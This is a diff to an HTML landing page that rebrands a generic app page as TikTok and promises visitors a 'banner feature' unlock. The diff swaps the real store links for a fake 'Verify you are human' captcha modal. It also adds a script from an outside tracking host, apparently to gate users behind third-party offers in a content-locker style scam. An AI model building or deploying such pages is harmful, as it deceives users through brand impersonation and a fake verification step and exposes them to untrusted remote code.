@@ -4,13 +4,14 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="color-scheme" content="dark">
-<title>AppName – Your profile, your banner, your vibe</title>
+<title>TikTok – Your profile, your banner, your vibe</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Sora:wght@600;800&family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
 :root{--bg:#050507;--card:#101014;--ink:#fff;--mute:#9a9aa8;--a:#25f4ee;--b:#fe2c55;color-scheme:dark;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
-html{scroll-padding-top:env(safe-area-inset-top,0px)}
+html{scroll-padding-top:env(safe-area-inset-top,0px);scroll-behavior:smooth}
+@media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
 *{box-sizing:border-box;margin:0}
 body{background:var(--bg);color:var(--ink);font:400 16px/1.6 Manrope,system-ui,sans-serif;overflow-x:hidden}
 h1,h2,h3,.logo{font-family:Syne,Manrope,sans-serif;letter-spacing:-.04em;line-height:1}
@@ -131,24 +132,27 @@ h1 .v{background:linear-gradient(90deg,var(--a),var(--b));-webkit-background-cli
 .store{display:flex;align-items:center;gap:12px}
 .store svg{width:28px;height:28px;flex:none}
 .store span{display:block}
-.md{position:fixed;inset:0;z-index:50;display:none;align-items:center;justify-content:center;padding:24px;background:rgba(0,0,0,.72);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px)}
+.md{position:fixed;inset:0;z-index:50;display:none;align-items:center;justify-content:center;padding:14px;background:rgba(0,0,0,.76);backdrop-filter:blur(7px);-webkit-backdrop-filter:blur(7px)}
 .md.on{display:flex}
-.mc{position:relative;width:100%;max-width:430px;background:#0f0f13;border:1px solid rgba(255,255,255,.14);border-radius:28px;padding:44px 32px 32px;text-align:center;box-shadow:0 0 70px rgba(254,44,85,.25),0 0 0 1px rgba(37,244,238,.2)}
-.mx{position:absolute;top:16px;right:16px;width:38px;height:38px;border-radius:50%;border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.06);color:#fff;font-size:16px;cursor:pointer}
-.mlg{width:72px;height:72px;border-radius:20px;border:3px solid var(--a);background:#0a0a0e;box-shadow:0 0 22px rgba(37,244,238,.5);margin:0 auto 22px;display:grid;place-items:center}
-.mlg:after{content:"";border-left:20px solid #fff;border-top:12px solid transparent;border-bottom:12px solid transparent;margin-left:5px}
-.mc h3{font-size:26px}
-.mc p{color:var(--mute);margin:10px 0 28px}
-.mgo{display:flex;align-items:center;justify-content:center;gap:10px;background:linear-gradient(90deg,var(--b),#ff5a7a);color:#fff;font-weight:700;padding:16px;border-radius:14px;box-shadow:0 10px 30px rgba(254,44,85,.4)}
-.mgo[hidden]{display:none}.mgo+.mgo{margin-top:12px}
-.mn{margin-top:20px;font-size:14px;color:var(--mute)}
-.mn b{color:var(--a)}
+.mc{position:relative;width:min(100%,404px);max-height:calc(100dvh - 28px);overflow-y:auto;background:linear-gradient(145deg,#15151a,#0b0b0f);border:1px solid rgba(37,244,238,.18);border-radius:26px;padding:34px 24px 22px;text-align:center;box-shadow:0 0 55px rgba(254,44,85,.16),0 0 0 1px rgba(255,255,255,.04);}
+.mx{position:absolute;top:12px;right:12px;width:35px;height:35px;border-radius:50%;border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.06);color:#fff;font-size:16px;cursor:pointer}
+.mlg{width:66px;height:66px;border-radius:19px;border:3px solid var(--a);background:#101015;box-shadow:0 0 22px rgba(37,244,238,.42),3px 3px 0 var(--b);margin:0 auto 16px;display:grid;place-items:center}
+.mlg:after{content:"";border-left:19px solid #fff;border-top:11px solid transparent;border-bottom:11px solid transparent;margin-left:5px}
+.mc h3{font-size:20px;letter-spacing:-.04em;line-height:1.2}
+.mc p{color:var(--mute);font-size:14px;margin:7px 0 22px}
+.captcha-frame{width:100%;max-width:350px;min-height:92px;margin:0 auto 14px;padding:14px 9px;border:1px dashed rgba(255,255,255,.19);border-radius:15px;background:rgba(255,255,255,.025);display:flex;align-items:center;justify-content:center;overflow:hidden}
+.captcha-frame [data-captcha-enable="true"]{width:100%;max-width:330px;min-height:64px;margin:0 auto;display:flex;align-items:center;justify-content:center}
+.captcha-frame iframe{max-width:100%!important}
+.captcha-note{margin-top:0;font-size:12px;color:#777783}
+.captcha-note strong{color:var(--a);font-weight:700}
+@media(max-width:480px){.md{padding:12px}.mc{width:100%;max-width:404px;padding:34px 18px 20px;border-radius:23px;max-height:calc(100dvh - 24px)}.mx{top:10px;right:10px;width:33px;height:33px}.mlg{width:62px;height:62px;margin-bottom:14px}.mc h3{font-size:19px}.mc p{font-size:13px;margin:7px 0 18px}.captcha-frame{padding:12px 7px;min-height:88px;margin-bottom:12px}.captcha-frame [data-captcha-enable="true"]{min-height:62px}}
+@media(max-height:430px){.md{align-items:flex-start}.mc{margin:auto 0}}
 </style>
 </head>
 <body>
 <div class="wrap">
 <nav>
- <a class="logo" href="#top"><i></i>AppName</a>
+ <a class="logo" href="#top"><i></i>TikTok</a>
  <div class="links"><a href="#features">Features</a><a href="#install">How to install</a><a class="pill" href="#get">Get the app</a></div>
 </nav>
 
@@ -157,7 +161,7 @@ h1 .v{background:linear-gradient(90deg,var(--a),var(--b));-webkit-background-cli
   <div class="badge">Join the banner trend</div>
   <h1><span>Your profile</span><span>Your banner</span><span class="v">Your vibe.</span></h1>
   <p>Not seeing banners on your account yet? Unlock the latest banner feature and make your profile stand out.</p>
-  <div class="stores">
+  <div class="stores" id="stores">
    <a class="store" href="#get"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#fff" d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg><span><small>Download on the</small>App Store</span></a>
    <a class="store" href="#get"><svg viewBox="0 0 32 32" aria-hidden="true"><polygon fill="#00c3ff" points="6,3 17,16 6,29"/><polygon fill="#00f076" points="6,3 21.2,12.6 17,16"/><polygon fill="#ffd500" points="21.2,12.6 27,16 21.2,19.4 17,16"/><polygon fill="#ff3a44" points="6,29 17,16 21.2,19.4"/></svg><span><small>GET IT ON</small>Google Play</span></a>
   </div>
@@ -208,26 +212,59 @@ h1 .v{background:linear-gradient(90deg,var(--a),var(--b));-webkit-background-cli
  <div>
   <h2>Make your profile <em>impossible to skip.</em></h2>
   <p>Tap the button to download the app on your phone.</p>
-  <a class="dl" href="#">⬇ Download free</a>
+  <a class="dl" href="#stores">⬇ Download free</a>
  </div>
  
 </div>
 
-<footer><span class="logo">AppName</span><div class="links"><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Contact</a></div><span>© 2026 AppName</span></footer>
+<footer><span class="logo">TikTok</span><div class="links"><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Contact</a></div><span>© 2026 TikTok</span></footer>
 </main>
 <script>
 (function(){var m=document.querySelector('.main .ban'),bs=document.querySelectorAll('.th button');
 bs.forEach(function(b){b.addEventListener('click',function(){m.style.background=b.dataset.bg;bs.forEach(function(x){x.style.boxShadow='none'});b.style.boxShadow='0 0 0 2px #fff'})});
 bs[3].style.boxShadow='0 0 0 2px #fff'})();
 </script>
-<div class="md" id="md" role="dialog" aria-modal="true" aria-labelledby="mt"><div class="mc"><button type="button" class="mx" aria-label="Close">✕</button><div class="mlg"></div><h3 id="mt">You’re almost there</h3><p>Continue to the store to install the app.</p><a class="mgo" id="mgo" href="#" target="_blank" rel="noopener"><span id="mgot">Continue</span> →</a><a class="mgo" id="mgo2" href="#" target="_blank" rel="noopener" hidden>Continue to Google Play →</a><div class="mn">100% free · <b>Only [SIZE] MB</b></div></div></div>
+<div class="md" id="md" role="dialog" aria-modal="true" aria-labelledby="mt">
+ <div class="mc">
+  <button type="button" class="mx" aria-label="Close">✕</button>
+  <div class="mlg" aria-hidden="true"></div>
+  <h3 id="mt">Verify you are human</h3>
+  <p>Complete the check to continue.</p>
+  <div class="captcha-frame"><div data-captcha-enable="true"></div></div>
+  <div class="captcha-note">Protected by <strong>this site</strong></div>
+ </div>
+</div></div>
 <script>
-(function(){var md=document.getElementById('md'),go=document.getElementById('mgo'),g2=document.getElementById('mgo2'),last=null,L={ios:'#',android:'#'};
-function open(k){var ios=k!=='android';document.getElementById('mgot').textContent='Continue to '+(ios?'App Store':'Google Play');go.href=ios?L.ios:L.android;g2.hidden=k!=='both';g2.href=L.android;md.classList.add('on');document.body.style.overflow='hidden';go.focus()}
-function close(){md.classList.remove('on');document.body.style.overflow='';if(last)last.focus()}
-document.addEventListener('click',function(e){var a=e.target.closest('.store,.dl');if(a){e.preventDefault();last=a;var t=a.textContent;open(/App Store/.test(t)?'ios':/Google Play/.test(t)?'android':'both')}
-if(e.target===md||e.target.closest('.mx'))close()});
-document.addEventListener('keydown',function(e){if(e.key==='Escape')close()})})();
+(function(){
+  var md=document.getElementById('md'),last=null;
+  function openCaptcha(){
+    md.classList.add('on');
+    document.body.style.overflow='hidden';
+    var closeButton=md.querySelector('.mx');
+    if(closeButton) closeButton.focus();
+  }
+  function closeCaptcha(){
+    md.classList.remove('on');
+    document.body.style.overflow='';
+    if(last) last.focus();
+  }
+  document.addEventListener('click',function(e){
+    var download=e.target.closest('.dl');
+    if(download){
+      e.preventDefault();
+      var stores=document.getElementById('stores');
+      if(stores) stores.scrollIntoView({behavior:window.matchMedia('(prefers-reduced-motion: reduce)').matches?'auto':'smooth',block:'center'});
+      return;
+    }
+    var store=e.target.closest('.store');
+    if(store){e.preventDefault();last=store;openCaptcha();return;}
+    if(e.target===md||e.target.closest('.mx')) closeCaptcha();
+  });
+  document.addEventListener('keydown',function(e){
+    if(e.key==='Escape'&&md.classList.contains('on')) closeCaptcha();
+  });
+})();
 </script>
+<script type="text/javascript" src="https://apptrck.net/cp/js/ymrzo"></script>
 </body>
 </html>
